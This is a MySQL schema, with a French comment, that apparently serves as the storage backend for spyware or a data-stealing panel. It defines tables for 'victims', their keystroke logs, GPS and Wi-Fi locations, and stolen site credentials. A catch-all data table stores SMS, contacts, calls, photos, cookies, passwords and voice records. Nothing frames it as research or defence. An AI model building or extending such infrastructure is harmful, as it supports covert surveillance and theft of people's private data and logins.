-- Structure optimisée avec index
CREATE TABLE IF NOT EXISTS victims (
    id VARCHAR(50) PRIMARY KEY,
    ip VARCHAR(45),
    user_agent TEXT,
    os VARCHAR(20),
    browser VARCHAR(50),
    device VARCHAR(50),
    country VARCHAR(100),
    city VARCHAR(100),
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_seen TIMESTAMP,
    data_count INT DEFAULT 0,
    INDEX idx_last_seen (last_seen),
    INDEX idx_ip (ip)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    victim_id VARCHAR(50),
    type ENUM('system','location','sms','contacts','calls','photos','passwords','history','cookies','email','voice','keylog','credentials'),
    content LONGTEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_victim (victim_id),
    INDEX idx_type (type),
    FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS locations (
    id INT AUTO_INCREMENT PRIMARY KEY,
    victim_id VARCHAR(50),
    lat DECIMAL(10,8),
    lng DECIMAL(11,8),
    accuracy FLOAT,
    source ENUM('gps','ip','wifi') DEFAULT 'gps',
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_victim_time (victim_id, timestamp),
    FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS keylogs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    victim_id VARCHAR(50),
    key_data TEXT,
    url TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_victim (victim_id),
    FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS credentials (
    id INT AUTO_INCREMENT PRIMARY KEY,
    victim_id VARCHAR(50),
    site VARCHAR(255),
    username VARCHAR(255),
    password TEXT,
    url TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_victim (victim_id),
    FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
